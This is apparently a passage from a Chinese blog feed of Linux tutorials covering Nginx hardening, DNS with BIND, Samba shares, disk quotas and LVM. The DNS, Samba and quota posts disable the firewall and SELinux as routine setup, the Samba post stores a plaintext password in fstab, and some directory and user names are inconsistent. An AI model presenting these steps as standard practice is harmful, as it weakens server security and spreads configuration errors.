id="（10）限制IP访问"><a href="#（10）限制IP访问" class="headerlink" title="（10）限制IP访问"></a><strong>（10）限制IP访问</strong></h2><p>location / {</p><p>​deny 192.168.1.1; #拒绝IP</p><p>​allow 192.168.1.0/24;   #允许IP</p><p>​allow 10.1.1.0/16;  #允许IP</p><p>​deny all;  #拒绝其他所有IP</p><p>}</p><h2 id="（11）删除缺省安装的无用文件"><a href="#（11）删除缺省安装的无用文件" class="headerlink" title="（11）删除缺省安装的无用文件"></a><strong>（11）删除缺省安装的无用文件</strong></h2><p>可根据实际情况删除，一般是 /var/www/html /var/www/cgi-bin 默认就是空的</p><h2 id="（12）监听地址绑定"><a href="#（12）监听地址绑定" class="headerlink" title="（12）监听地址绑定"></a><strong>（12）监听地址绑定</strong></h2><p>服务器有多个 IP 地址时，只监听提供服务的 IP 地址</p><p><img src="https://pic.imgdb.cn/item/66ac9956d9c307b7e933d57c.png"></p><p>默认设置是Listen 80监听所有地址，如果服务器只有一个IP地址可不做该项设置，如果有多个IP可以按照需要设</p><h2 id="（13）关闭-TRACE功能"><a href="#（13）关闭-TRACE功能" class="headerlink" title="（13）关闭 TRACE功能"></a><strong>（13）关闭 TRACE功能</strong></h2><p>关闭TRACE，防止TRACE方法被访问者恶意利用</p><p>server { </p><p>​  … </p><p>  location / { </p><pre><code>    ... </code></pre><p>​    # 禁用 TRACE 方法 </p><p>​    if ($request_method = TRACE) { </p><p>​      return 444; </p><p>​    } </p><p>  } </p><p>}</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nginx的安全加固 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNS服务器配置</title>
      <link href="/2024/07/31/dns-fu-wu-qi-pei-zhi/"/>
      <url>/2024/07/31/dns-fu-wu-qi-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h1 id="DNS服务器配置"><a href="#DNS服务器配置" class="headerlink" title="DNS服务器配置"></a>DNS服务器配置</h1><h2 id="DNS的查询流程"><a href="#DNS的查询流程" class="headerlink" title="DNS的查询流程"></a>DNS的查询流程</h2><ol><li><p>先查看本机的/etc/hosts </p></li><li><p>查看本地的DNS缓存服务器</p></li><li><p>查找所属域的首选DNS服务器</p></li><li><p>根域名服务器进行查询</p></li></ol><h2 id="DNS的查询规则"><a href="#DNS的查询规则" class="headerlink" title="DNS的查询规则"></a>DNS的查询规则</h2><p>递归式查询，即client向支持递归查询的DNS Server发出解析请求，则自DNS服务器不论是自身直接解析还是无法解析想根发出请求，总会由其向client返回一个结果。（老好人，会帮你一直查，查到返回给你结果）</p><p>迭代式查询，即接收client解析请求的DNS Server，若其能够解析则直接返回结果，若其不能解析将把解析请求交给其他DNS服务器，而不是自己亲自将解析过程完成。 （踢皮球，让你去找别人去得到结果）</p><h2 id="DNS记录的类型"><a href="#DNS记录的类型" class="headerlink" title="DNS记录的类型"></a>DNS记录的类型</h2><p>A：主机记录，域名向ip地址转换的记录；</p><p>PTR：反向指针记录，ip地址向域名转换的记录；</p><p>NS：代表域内的dns服务器；</p><p>MX：邮件交换记录，代表域内的邮件服务器；</p><p>CNAME：别名记录，域名的别名；</p><p>SOA：起始授权机构，start of authority用于标示域内主DNS服务器。</p><h2 id="DNS服务器的安装与配置"><a href="#DNS服务器的安装与配置" class="headerlink" title="DNS服务器的安装与配置"></a>DNS服务器的安装与配置</h2><h3 id="安装DNS并启动相关服务"><a href="#安装DNS并启动相关服务" class="headerlink" title="安装DNS并启动相关服务"></a>安装DNS并启动相关服务</h3><ol><li>安装bind程序包：</li></ol><p>​#yum install bind</p><ol start="2"><li>启动服务，DNS服务名是：named</li></ol><p>​# systemctl start named</p><h3 id="配置案例：以gok-com为例配置DNS服务器"><a href="#配置案例：以gok-com为例配置DNS服务器" class="headerlink" title="配置案例：以gok.com为例配置DNS服务器"></a>配置案例：以gok.com为例配置DNS服务器</h3><h3 id="主配置文件分析"><a href="#主配置文件分析" class="headerlink" title="主配置文件分析"></a>主配置文件分析</h3><p>​#vim /etc/named.conf<br>     listen-on port 53 { any; };//服务监听端口为53<br>     allow-query     { any; };//服务监听端口为53<br>​     include “/etc/named.rfc1912.zones”;     //一般将区域（域名）写到这个文件中，不直接写主配置文件中</p><h3 id="扩展配置文件分析"><a href="#扩展配置文件分析" class="headerlink" title="扩展配置文件分析"></a>扩展配置文件分析</h3><p>#vim /etc/named.rfc1912.zones</p><p>zone “gok.com.” IN {<br>        type master;   //区域类型：master【主要区域】   hint【根区域】 slave【备份区域】 forward【转发区域】<br>        file “gok.com.zone”;    //指定区域配置文件，存放在/var/named目录下，需要手动创建<br>        allow-update { none; };  //不允许客户端更新<br>};</p><h3 id="区域配置文件分析"><a href="#区域配置文件分析" class="headerlink" title="区域配置文件分析"></a>区域配置文件分析</h3><p>#cd /var/named<br>#cp named.localhost  gok.com.zone//复制一个模板来进行更改<br>#vim gok.com.zone //编辑区域配置文件<br>$TTL 1D //更新为最长1天<br>@       IN SOA    gok.com**.**    root.gok.com**.** (<br>                                                                              0       ; serial<br>                                                                            1D      ; refresh<br>                                                                            1H      ; retry<br>                                                                            1W      ; expire<br>                                                                            3H )    ; minimum<br>            NS      dns.gok.com**.**<br>dns       A       192.168.10.1<br>www     A       192.168.10.1</p><h3 id="重启服务并配置防火墙允许访问"><a href="#重启服务并配置防火墙允许访问" class="headerlink" title="重启服务并配置防火墙允许访问"></a>重启服务并配置防火墙允许访问</h3><p>#systemctl restart named//重启服务</p><p>#systemctl stop firewalld //关闭防火墙</p><p>#setenforce 0 //关闭SElinux安全机制</p><h3 id="区域配置文件给予权限"><a href="#区域配置文件给予权限" class="headerlink" title="区域配置文件给予权限"></a>区域配置文件给予权限</h3><p>DNS客户端查询时是以named身份进行查询</p><p>#chown named:named gok.com.zone</p><h3 id="检查配置是否有问题"><a href="#检查配置是否有问题" class="headerlink" title="检查配置是否有问题"></a>检查配置是否有问题</h3><p>#named-checkconf   检查配置文件是否有语法错误</p><p>#named-checkzone gok.com gok.com.zone   检查区域配置文件是否有错误</p><h3 id="客户端配置"><a href="#客户端配置" class="headerlink" title="客户端配置"></a>客户端配置</h3><p>配置IP及DNS地址</p><p>将客户机的DNS服务器地址配置为DNS服务器的IP地址</p><p>DNS域名解析测试：使用nslookup命令测试DNS服务器</p><p>#nslookup</p><p>&gt; <a href="http://www.gok.com/">www.gok.com</a></p><p>能成功解析出对应的IP则证明DNS服务器配置成功</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DNS服务器配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>samba服务器</title>
      <link href="/2024/07/29/samba-fu-wu-qi/"/>
      <url>/2024/07/29/samba-fu-wu-qi/</url>
      
        <content type="html"><![CDATA[<h1 id="samba服务器"><a href="#samba服务器" class="headerlink" title="samba服务器"></a>samba服务器</h1><blockquote><p>Samba是一款在Linux/Unix系统上实现与windows系统进行文件共享的免费开源软件。广泛应用于Unix-like与Windows之间，提供文件共享和打印机共享服务，使得不同系统之间跨平台共享资源更加便捷.Samba服务由服务端及客户端程序构成，采用的是smb/cifs网络协议。samba有两个主要的进程smbd和nmbd。smbd进程提供了文件和打印服务，而nmbd则提供了NetBIOS名称服务和浏览支持，帮助SMB客户定位服务器，处理所有基于UDP的协议。</p></blockquote><h2 id="Linux中配置samba服务器"><a href="#Linux中配置samba服务器" class="headerlink" title="Linux中配置samba服务器"></a>Linux中配置samba服务器</h2><h3 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h3><p>（1）samba服务器目录</p><p>企业数据目录：/companydata</p><p>公共目录：/companydata/public</p><p>销售部目录：/companydata/sales</p><p>技术部：/companydata/tech</p><p>（2）企业员工情况</p><p>总经理：zjl</p><p>销售部：销售部经理 xsjl 员工 xsy1、员工 xsy2</p><p>技术部：技术部经理 jsjl、员工 jsy1、员工 jsy2</p><p>（3）samba服务要求</p><p>搭建samba文件服务器，建立公共共享目录，允许所有人访问，权限为只读，为销售部和技术部分别建立单独的目录，只可以总经理和相应部门员工访问，并且公司员工禁止访问非本部门的共享目录。</p><h3 id="配置分析"><a href="#配置分析" class="headerlink" title="配置分析"></a>配置分析</h3><p>​        对于建立公共目录public字段就可以实现匿名访问，员工只能访问本部门的共享目录，禁止访问非本部门的共享目录，可以通过设置目录共享字段“browseable = no”及字段“valid users”来实现其隐藏功能和相应的访问权限。这样设置不能很好得解决同一目录多种需求的权限设置，所以需要建立独立配置文件，为每个部门建立一个组后并为每个组建立配置文件来实现隔离用户权限会比较灵活。</p><h3 id="配置实施"><a href="#配置实施" class="headerlink" title="配置实施"></a>配置实施</h3><h4 id="安装samba并启动samba服务"><a href="#安装samba并启动samba服务" class="headerlink" title="安装samba并启动samba服务"></a>安装samba并启动samba服务</h4><p># yum install -y samba samba-client </p><p># systemctl start smb.service nmb.service</p><h4 id="修改防火墙设置"><a href="#修改防火墙设置" class="headerlink" title="修改防火墙设置"></a>修改防火墙设置</h4><p>关闭selinux安全机制：setenforce 0 </p><p>关闭防火墙：systemctl stop firewalld</p><h4 id="建立各部门专用共享目录"><a href="#建立各部门专用共享目录" class="headerlink" title="建立各部门专用共享目录"></a>建立各部门专用共享目录</h4><p>#mkdir -p /companydata/public /companydata/xsb /company/jsb</p><h4 id="添加用户和组"><a href="#添加用户和组" class="headerlink" title="添加用户和组"></a>添加用户和组</h4><p># groupadd xsb//创建销售部</p><p># groupadd jsb     //创建技术部</p><p># useradd zjl//创建总经理</p><p># useradd  xsjl（xsy1/xsy2） //创建销售经理，销售成员1、2</p><p># useradd  jsjl （jsy1/jsy2）//创建技术经理，技术成员1、2</p><p># gpasswd -M xsjl,xsy1,xsy2 xsb//将销售经理，销售成员1、2加入销售部</p><p># gpasswd -M jsjl,jsy1,jsy2 jsb//技术部同理</p><h4 id="设置samba用户"><a href="#设置samba用户" class="headerlink" title="设置samba用户"></a>设置samba用户</h4><p>使用smbpasswd命令添加samba用户。</p><p># smbpasswd -a zjl</p><p>New SMB password:        输入samba用户密码</p><p>Retype new SMB password:    确认samba用户密码</p><p>Added user zjl.</p><p># smbpasswd -a xsjl</p><p># smbpasswd -a xsy1</p><p># smbpasswd -a xsy2</p><p># smbpasswd -a jsjl</p><p># smbpasswd -a jsy1</p><p># smbpasswd -a jsy2</p><p><strong>查看samba用户：pdbedit -L</strong></p><p><strong>删除samba用户：smbpasswd -x xxx</strong></p><p><strong>修改密码：smbpasswd 用户名</strong>       </p><h4 id="配置smb-conf文件"><a href="#配置smb-conf文件" class="headerlink" title="配置smb.conf文件"></a>配置smb.conf文件</h4><p># vim /etc/samba/smb.conf  具体配置如下：<br>[public]<br>        comment = public<br>        path = /companydata/public<br>        <strong>public = yes</strong>//是否公开<br>[xsb]<br>        comment = xsb//注释<br>        path = /companydata/sales<br>        <strong>guest ok = no</strong>//是否允许用户匿名访问<br>        <strong>writable = yes</strong>  //是否可写<br>        <strong>valid users = @xsb,zjl</strong>//允许指定用户访问（@代表一个组）<br>[jsb]<br>        comment=jsb<br>        path = /companydata/tech<br>        <strong>guest ok = no</strong><br>        <strong>writable = yes</strong><br>        <strong>valid users = @jsb,zjl</strong></p><p>配置完成之后，重启服务</p><p><strong># systemctl start smb.service nmb.service（或smb nmb）</strong></p><h4 id="配置文件权限"><a href="#配置文件权限" class="headerlink" title="配置文件权限"></a>配置文件权限</h4><p>（1）公共目录：/companydata/public，允许所有用户读取文件但不能修改，权限保持默认。</p><p>（2）销售部目录：/companydata/xsb和技术部目录：/companydata/tjsb只允许本部门   用户写入数据，但不能删除其他用户的数据，不允其他部门访问，但总经理可以查看   不能修改，权限设置如下：</p><p>#chown xsbjl:xsb /companydata/xsb//设置文件夹的所有者以及所有组</p><p>#chown jsbjl:jsb /companydata/jsb</p><p>#setfacl -m u:zjl:rwx /companydata/sales//给总经理一个ACL权限，再不加入部门组的情况下，访问部门文件</p><p>#setfacl -m u:zjl:rwx /companydata/tech</p><h4 id="客户端进行访问测试"><a href="#客户端进行访问测试" class="headerlink" title="客户端进行访问测试"></a>客户端进行访问测试</h4><p>在访问测试之前应该注意权限的设置,影响权限的因素有：<u><strong>共享权限，文件本身的权限，selinux安全机制</strong></u><br>    Windows客户端：\\192.168.10.129\public<br>    Linux客户端：首先安装samba-client客户端工具</p><p># smbclient -L 192.168.149.192     以服务器的root用户查看共享文件有哪些</p><p># smbclient -U xsjl -L 192.168.149.192    以samba用户查看服务器的共享文件有哪些</p><p># smbclient -U zjl //192.168.149.192/public    访问服务器共享文件</p><p>  smb: &gt;<br>  常用命令：ls    mkdir    put   get   rm </p><h2 id="Windows中配置samba服务器"><a href="#Windows中配置samba服务器" class="headerlink" title="Windows中配置samba服务器"></a>Windows中配置samba服务器</h2><p>案例2：Windows作为samba服务器（前提是你的用户必须是英文的）</p><p>（1）在Windows系统中设置一个共享目录：D:\sharefiles ,在属性中找到共享，并共享文件夹<br>（2）在Linux下安装 samba-client 客户端 </p><p>​# yum install samba-client</p><p>（3）安装 cifs-utils 软件包 </p><p>​# yum install cifs-utils</p><p>（4）在 Linux 下创建一个挂载点 </p><p>​# mkdir /mnt/Windows</p><p>（5）挂载 Windows 上的共享目录 D:\sharefiles 到 Linux 下的/mnt/Windows 目录下 </p><p>​# mount -t cifs -o username=HHHXXX //192.168.0.3/sharefiles /mnt/Windows      Enter password: ********<br>​192.168.0.3为windows的ip，并输入windows对应用户的登陆密码</p><p>（6）如果挂载成功，则可以进入/mnt/Windows 下进行相应操作。<br>（7）在Linux下/etc/fstab 文件中，加入该共享目录的挂载信息 （永久挂载）<br>       192.168.0.3/sharefiles /mnt/Windows cifs username=HHHXXX,password=**** 0 0<br>（8）到此为止，Windows 上的共享目录//192.168.0.3/sharefiles就被成功挂载到了 Linux上面了，并且 Linux 重启后，会自动挂载该目录到/mnt/Windows 目录下</p><h2 id="在Windows系统使用samba切换用户解决办法"><a href="#在Windows系统使用samba切换用户解决办法" class="headerlink" title="在Windows系统使用samba切换用户解决办法"></a>在Windows系统使用samba切换用户解决办法</h2><blockquote><p>samba是不允许一台电脑同时连接两个Linux用户的共享文件夹的</p><p>因此需要先断开之前用户的连接，然后再访问其他用户的共享文件夹</p></blockquote><p>断开方法如下：</p><p>1、win+R输入cmd打开命令行工具</p><p>2、输入net use查看当前的连接</p><p>3、可以看到一条正在链接的，地址为对应远程的内容</p><p>输入指令进行删除连接</p><p>#net use \\ip\IPC$ /delete</p>]]></content>
      
      
      <categories>
          
          <category> Linux and Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> samba服务器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>磁盘配额</title>
      <link href="/2024/07/23/ci-pan-pei-e/"/>
      <url>/2024/07/23/ci-pan-pei-e/</url>
      
        <content type="html"><![CDATA[<h1 id="磁盘配额"><a href="#磁盘配额" class="headerlink" title="磁盘配额"></a>磁盘配额</h1><p>quota 磁盘配额功能只在指定的文件系统（分区）内有效，未设置配额的文件系统不受限制。 </p><p>quota 针对指定的用户账号、组账号进行限制，其他用户或组不受影响。 </p><p><strong>磁盘配额可以进行两方面的限制：磁盘容量、文件数量</strong></p><h2 id="磁盘配额的限制方法"><a href="#磁盘配额的限制方法" class="headerlink" title="磁盘配额的限制方法"></a>磁盘配额的限制方法</h2><p>分为<u>软限制</u>和<u>硬限制</u>两种</p><p>软限制：在固定的宽限期（默认为 7 天）内允许暂时超过这个限制，但系统会给出警告信息</p><p>硬限制：绝对禁止用户超过该限值。</p><p>硬限制的配额值应大于相应的软限制值，否则软限制值将失效。</p><h2 id="检查是否安装了-quota-工具"><a href="#检查是否安装了-quota-工具" class="headerlink" title="检查是否安装了 quota 工具"></a>检查是否安装了 quota 工具</h2><blockquote><p>Linux 默认是安装了 quota 工具</p></blockquote><p>查看是否安装</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]#rpm -qa | grep quota</span><br></pre></td></tr></tbody></table></figure><h2 id="磁盘配额-1"><a href="#磁盘配额-1" class="headerlink" title="磁盘配额"></a>磁盘配额</h2><p>以/dev/sdc1为例，先将其挂载到“/data”目录下，然后在文件系统中实现磁盘配额。</p><h3 id="预先准备"><a href="#预先准备" class="headerlink" title="预先准备"></a>预先准备</h3><p>首先，先将硬盘分区</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fdisk /dev/sdc</span><br></pre></td></tr></tbody></table></figure><img src="https://pic.imgdb.cn/item/669f6b97d9c307b7e9d60aca.png" style="zoom:67%;"><p>将其文件系统更改为8e（Linux LVM）</p><p><img src="https://pic.imgdb.cn/item/669f6bfbd9c307b7e9d66d70.png"></p><p>w   write table to disk and exit</p><p><img src="https://pic.imgdb.cn/item/669f6c3cd9c307b7e9d6b70c.png"></p><p>查看硬盘总空间，发现分区成功</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l    </span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic.imgdb.cn/item/669f6e22d9c307b7e9d8d72c.png"></p><p>格式化分区</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfs -t ext4 /dev/sdc1</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic.imgdb.cn/item/669f7010d9c307b7e9dac052.png"></p><p>挂载到/data</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount /dev/sdc1 /data</span><br></pre></td></tr></tbody></table></figure><h3 id="启用quota-磁盘配额"><a href="#启用quota-磁盘配额" class="headerlink" title="启用quota 磁盘配额"></a>启用quota 磁盘配额</h3><p>修改配置文件“/etc/fstab”的方式启用 quota 磁盘配额（永久启用）</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/fstab</span><br><span class="line">加入/dev/sdc1  /data   ext4           defaults,usrquota,grpquota           0     0</span><br></pre></td></tr></tbody></table></figure><p>将该文件系统重新挂载</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -o remount /data</span><br></pre></td></tr></tbody></table></figure><p>查看已经挂载的文件系统，检查是否已经启用了 usrquota 和grpquota 功能</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount | grep sdc1</span><br></pre></td></tr></tbody></table></figure><h3 id="生成配额文件"><a href="#生成配额文件" class="headerlink" title="生成配额文件"></a>生成配额文件</h3><p>将 SELinux 设为许可模式</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setenforce 0</span><br></pre></td></tr></tbody></table></figure><p>然后执行quotacheck 命令</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">quotacheck -cvug /data</span><br></pre></td></tr></tbody></table></figure><p>-c：不管原有的配置文件，重新扫描并建立新的配置文件<br>-v：显示扫描过程<br>-u：建立用户配额的配置文件，也就是生成 aquota.user 文件<br>-g：建立组配额的配置文件，会生成 aquota.group 文件 </p><p>查看生成的配额</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /data</span><br></pre></td></tr></tbody></table></figure><p>可以看到这三个内容 aquota.group、aquota.user、lost+found</p><h3 id="编辑用户的配额设置"><a href="#编辑用户的配额设置" class="headerlink" title="编辑用户的配额设置"></a>编辑用户的配额设置</h3><p>设置用户的zhangsan的磁盘配额</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edquota -u zhangsan</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic.imgdb.cn/item/669f72e7d9c307b7e9de9bc4.png"></p><h3 id="激活磁盘配额"><a href="#激活磁盘配额" class="headerlink" title="激活磁盘配额"></a>激活磁盘配额</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">quotaon -ugv /data</span><br></pre></td></tr></tbody></table></figure><p>-u，激活用户磁盘配额。<br>-g，激活组磁盘配额。<br>-v，显示详细信息。</p><h3 id="验证并查看磁盘配额"><a href="#验证并查看磁盘配额" class="headerlink" title="验证并查看磁盘配额"></a>验证并查看磁盘配额</h3><p>使用受配额限制的用户帐号（zhangsan）登录 Linux 系统，并向应用了配额的文件系统进行复制文件等写操作，测试所设置磁盘配额项是否有效</p><p>用 dd 命令生成指定大小的测试文件，从设备文件/dev/zero 中复制数据到/data/文件，读取 500个大小为 1MB 的数据块。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]#chmod 777 /data   开放 data/的写入权限</span><br><span class="line">[zhangsan@localhost ~]# dd if=/dev/zero of=/data/文件  bs=1MB count=500</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic.imgdb.cn/item/669f78abd9c307b7e9e3f1a7.png"></p><p>读取 550个大小为 1MB 的数据块，超出硬限制</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[zhangsan@localhost ~]# dd if=/dev/zero of=/data/文件  bs=1MB count=550</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic.imgdb.cn/item/669f7904d9c307b7e9e43eee.png"></p><h2 id="配额复制"><a href="#配额复制" class="headerlink" title="配额复制"></a>配额复制</h2><p>tom 用户的配额值和 jerry用户完全一样，我们就可以使用 jerry用户作为模板进行复制。这样我们如果需要建立大量的配额值一致的用户时，就会非常方便，不用一个个手工建立了。复制命令如下： </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]#edquota -p jerry -u tom     命令: -p 源用户 -u 目标用户 </span><br></pre></td></tr></tbody></table></figure><h2 id="关闭磁盘配额"><a href="#关闭磁盘配额" class="headerlink" title="关闭磁盘配额"></a>关闭磁盘配额</h2><p>利用 quotaoff -vug 命令关闭磁盘配额</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]#quotaoff -vug /data</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 磁盘配额 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LVM逻辑卷管理</title>
      <link href="/2024/07/23/lvm-luo-ji-juan-guan-li/"/>
      <url>/2024/07/23/lvm-luo-ji-juan-guan-li/</url>
      
        <content type="html"><![CDATA[<h1 id="LVM逻辑卷管理"><a href="#LVM逻辑卷管理" class="headerlink" title="LVM逻辑卷管理"></a>LVM逻辑卷管理</h1><h2 id="逻辑卷创建步骤"><a href="#逻辑卷创建步骤" class="headerlink" title="逻辑卷创建步骤"></a>逻辑卷创建步骤</h2><blockquote><p>假设我们使用sdb和sdc两个磁盘来做LVM逻辑卷。</p></blockquote><ul><li><p>第一步：建立分区并将其修改为8e(Linux LVM 文件系统)<br>  <strong>#fdisk /dev/sdb</strong><br>  命令(输入 m 获取帮助)：n   //创建分区<br>  Select (default p): p//创建主分区<br>  分区号 (1-4，默认 1)：  回车<br>  起始 扇区 (2048-4194303，默认为 2048)：回车<br>  //将使用默认值 2048<br>  Last 扇区, +扇区 or +size{K,M,G} (2048-4194303，默认为 4194303)：回车<br>  //将使用默认值 4194303<br>  分区 1 已设置为 Linux 类型，大小设为 2 GiB<br>  命令(输入 m 获取帮助)：t     //更改文件系统类型可以用 l 查看有哪些文件系统类型<br>  已选择分区 1<br>  Hex 代码(输入 L 列出所有代码)：8e<br>  已将分区“Linux”的类型更改为“Linux LVM”</p></li><li><p>第二步：创建物理卷（PV）<br>  #pvcreate /dev/sd[bc]1 创建物理卷<br>  #pvscan     查看物理卷<br>  #pvdisplay    查看物理卷的详细信息</p></li><li><p>第三步: 创建卷组并将PV加入到卷组（VG）<br>  #vgcreate vgroup /dev/sd[bc]1        创建名为vgroup的卷组，将sdb、sdc加入卷组<br>  #vgscan查看卷组<br>  #vgdisplay</p></li><li><p>第四步：建立逻辑卷FTP和WEB（LV）<br>  #lvcreate -L 2G -n WEB /dev/vgroup       创建名为WEB的逻辑卷，从卷组vgroup中分给它2G的空间<br>  #lvcreate -L 1.99G -n FTP /dev/vgroup<br>  #lvscan    查看逻辑卷<br>  #lvdisplay</p></li><li><p>第五步：格式化逻辑卷并挂载使用<br>  #mkfs -t ext4 /dev/vgroup/WEB    格式化逻辑卷选择的文件系统为ext4<br>  #mkfs -t ext4 /dev/vgroup/FTP<br>  #mount /dev/vgroup/FTP /mnt/ftp  将逻辑卷挂在到预先创建的挂载目录<br>  #mount /dev/vgroup/WEB /mnt/web</p></li></ul><h2 id="如果ftp卷已经用完了，如何进行扩展呢？"><a href="#如果ftp卷已经用完了，如何进行扩展呢？" class="headerlink" title="如果ftp卷已经用完了，如何进行扩展呢？"></a>如果ftp卷已经用完了，如何进行扩展呢？</h2><p>#vgextend vgroup /dev/sdd1   扩展vg卷组，/dev/sdd为将要加入卷组的物理卷<br>#vgdisplay<br>#lvresize -L +2G /dev/vgroup/FTP  将逻辑卷扩展2G<br>#resize2fs /dev/vgroup/FTP</p><h2 id="如何删除逻辑卷？"><a href="#如何删除逻辑卷？" class="headerlink" title="如何删除逻辑卷？"></a>如何删除逻辑卷？</h2><p>#删除挂载<br>[root@localhost mnt]# umount /mnt/ftp<br>[root@localhost mnt]# umount /mnt/web<br>#删除逻辑卷<br>[root@localhost mnt]# lvremove /dev/vgroup/FTP<br>Do you really want to remove active logical volume vgroup/FTP? [y/n]: y<br>  Logical volume “FTP” successfully removed<br>[root@localhost mnt]# lvremove /dev/vgroup/WEB<br>Do you really want to remove active logical volume vgroup/WEB? [y/n]: y<br>  Logical volume “WEB” successfully removed<br>#删除卷组<br>[root@localhost mnt]# vgremove /dev/vgroup<br>  Volume group “vgroup” successfully removed</p><h2 id="磁盘分区需要挂载（mount）的原因"><a href="#磁盘分区需要挂载（mount）的原因" class="headerlink" title="磁盘分区需要挂载（mount）的原因"></a>磁盘分区需要挂载（mount）的原因</h2><h3 id="1-文件系统的支持"><a href="#1-文件系统的支持" class="headerlink" title="1. 文件系统的支持"></a>1. <strong>文件系统的支持</strong></h3><ul><li><strong>文件系统的识别</strong>：每个分区中可能使用不同的文件系统（如NTFS、FAT32、ext4等）。挂载操作是操作系统识别和加载特定分区上文件系统的关键步骤。挂载过程中，操作系统会读取分区的文件系统结构，以确定如何访问其中的数据。</li><li><strong>访问控制</strong>：通过挂载，操作系统能够正确地解析文件和目录的结构，这令其能够按照文件系统的规则执行读写操作。</li></ul><h3 id="2-资源管理"><a href="#2-资源管理" class="headerlink" title="2. 资源管理"></a>2. <strong>资源管理</strong></h3><ul><li><strong>统一的资源管理</strong>：挂载机制使得操作系统能够将多个文件系统整合到一个统一的命名空间中。这样，用户和应用程序可以通过一致的路径来访问不同分区上的数据，而不需要直接与底层设备交互。</li><li><strong>管理和隔离</strong>：挂载点的设计允许操作系统在多个存储设备之间有效管理资源，同时也防止了设备之间的干扰。这样可以确保不同分区或设备的数据隔离和安全。</li></ul><h3 id="3-数据安全性"><a href="#3-数据安全性" class="headerlink" title="3. 数据安全性"></a>3. <strong>数据安全性</strong></h3><ul><li><strong>权限和安全控制</strong>：操作系统在挂载时可以设置访问权限，决定哪些用户或程序可以读取或修改特定分区上的数据。这是确保系统安全性和数据保护的重要机制。</li><li><strong>防止意外错误</strong>：如果文件系统在没有挂载的情况下直接访问，可能会导致数据损坏或读写错误，因为操作系统无法保证对数据结构的有效性和完整性。</li></ul><h3 id="4-异步和缓存机制"><a href="#4-异步和缓存机制" class="headerlink" title="4. 异步和缓存机制"></a>4. <strong>异步和缓存机制</strong></h3><ul><li><strong>优化访问速度</strong>：挂载过程允许操作系统通过使用缓存机制来优化文件的读取和写入速度。通过挂载，操作系统可以更好地管理内存和存储的使用。</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>总的来说，挂载是将分区或文件系统集成到操作系统的文件结构中的必要步骤，它确保了数据的有效访问、安全性和资源的合理管理。通过挂载，操作系统可以为用户和应用提供一种一致、安全的方式来存储和访问数据。</p><h2 id="磁盘分区格式化的原理"><a href="#磁盘分区格式化的原理" class="headerlink" title="磁盘分区格式化的原理"></a>磁盘分区格式化的原理</h2><ol><li><strong>分区表</strong>：<ul><li>磁盘通常被划分为多个分区，每个分区都有一个分区表，包含了各个分区的信息（如起始位置、大小和类型）。</li></ul></li><li><strong>文件系统的创建</strong>：<ul><li>格式化过程中，系统会在特定分区内创建一个文件系统 (如NTFS, FAT32, 